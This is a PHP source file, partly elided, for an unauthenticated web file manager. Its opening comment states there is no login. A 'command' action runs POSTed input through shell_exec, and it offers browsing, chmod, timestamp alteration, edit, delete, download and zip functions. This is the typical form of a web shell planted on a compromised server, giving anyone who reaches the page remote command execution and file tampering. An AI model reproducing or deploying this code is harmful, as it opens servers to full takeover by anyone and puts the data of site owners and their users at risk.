<?php
// No login / password protection — public access
...
if (isset($_POST['action'])) {
    ...
    switch ($_POST['action']) {
        ...
        case 'command':
            ...
            if ($command) {
                // run command in current path and capture output
                $escaped = str_replace(["\n", "\r"], '', $command);
                $output = shell_exec("cd " . escapeshellarg($current_path) . " && " . $escaped . " 2>&1");
            }
            break;
    }
...
<body>
    ...
    <table>
        ...
        <tbody>
            ...
            <?php foreach ($folders as $item): ?>
                ...
                <tr>
                    <td>
                        <a href="?path=<?= urlencode($item_path) ?>"><?= htmlspecialchars($item) ?></a>
                    </td>
                    <td>Directory</td>
                    <td></td>
                    <td><?= htmlspecialchars(substr(sprintf('%o', @fileperms($item_path)), -4)) ?></td>
                    <td><?= function_exists('posix_getpwuid') ? htmlspecialchars(posix_getpwuid(@fileowner($item_path))['name'] . '/' . posix_getgrgid(@filegroup($item_path))['name']) : htmlspecialchars(@get_current_user()) ?></td>
                    <td><?= htmlspecialchars(date("Y-m-d H:i:s", @filemtime($item_path))) ?></td>
                    <td>
                        <button onclick="openRenameModal('<?= htmlspecialchars($item) ?>')">Rename</button>
                        <button onclick="openChmodModal('<?= htmlspecialchars($item) ?>')">Chmod</button>
                        <button onclick="openTimestampModal('<?= htmlspecialchars($item) ?>')">Timestamp</button>
                        <button onclick="if(confirm('Are you sure?')) { document.getElementById('deleteForm<?= htmlspecialchars($item) ?>').submit(); }">Delete</button>
                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
                        <button onclick="if(confirm('Compress this folder?')) { document.getElementById('compressForm<?= htmlspecialchars($item) ?>').submit(); }">Compress</button>
                        <form id="deleteForm<?= htmlspecialchars($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
                            <input type="hidden" name="action" value="delete">
                        </form>
                        <form id="compressForm<?= htmlspecialchars($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
            ...
            <?php foreach ($files as $item): ?>
                ...
                <tr>
                    ...
                    <td>File</td>
                    <td><?= htmlspecialchars(filesize($item_path) . ' bytes') ?></td>
                    <td><?= htmlspecialchars(substr(sprintf('%o', @fileperms($item_path)), -4)) ?></td>
                    <td><?= function_exists('posix_getpwuid') ? htmlspecialchars(posix_getpwuid(@fileowner($item_path))['name'] . '/' . posix_getgrgid(@filegroup($item_path))['name']) : htmlspecialchars(@get_current_user()) ?></td>
                    <td><?= htmlspecialchars(date("Y-m-d H:i:s", @filemtime($item_path))) ?></td>
                    <td>
                        ...
                        <button onclick="openChmodModal('<?= htmlspecialchars($item) ?>')">Chmod</button>
                        <button onclick="openTimestampModal('<?= htmlspecialchars($item) ?>')">Timestamp</button>
                        <button onclick="openEditor('<?= htmlspecialchars($item) ?>')">Edit</button>
                        <button onclick="if(confirm('Are you sure?')) { document.getElementById('deleteForm<?= htmlspecialchars($item) ?>').submit(); }">Delete</button>
                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
                        <?php if (pathinfo($item_path, PATHINFO_EXTENSION) === 'zip'): ?>
                            <button onclick="if(confirm('Uncompress this file?')) { document.getElementById('uncompressForm<?= htmlspecialchars($item) ?>').submit(); }">Uncompress</button>
                        <?php else: ?>
                            <button onclick="if(confirm('Compress this file?')) { document.getElementById('compressForm<?= htmlspecialchars($item) ?>').submit(); }">Compress</button>
                        <?php endif; ?>
                        <form id="deleteForm<?= htmlspecialchars($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
                            <input type="hidden" name="action" value="delete">
                        ...
                        <form id="uncompressForm<?= htmlspecialchars($item) ?>" action="" method="post" style="display:none;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
    ...
    <script>
        ...
        function openEditor(file) {
            ...
            fetch('?path=<?= urlencode($current_path) ?>&file=' + encodeURIComponent(file) + '&raw=true')
